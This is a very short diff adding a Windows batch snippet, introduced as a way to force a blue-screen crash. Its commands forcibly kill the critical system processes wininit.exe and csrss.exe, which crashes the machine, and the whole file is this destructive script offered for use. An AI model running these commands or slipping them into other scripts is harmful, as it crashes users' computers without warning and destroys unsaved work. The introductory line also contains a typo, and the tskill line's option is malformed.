@@ -1,0 +1,7 @@
+If you want to make a BSoD + a forced
+crash type in thie code shown below:
+
+
+taskkill /f /im wininit.exe
+tskill csrss.exe /F
+@exit
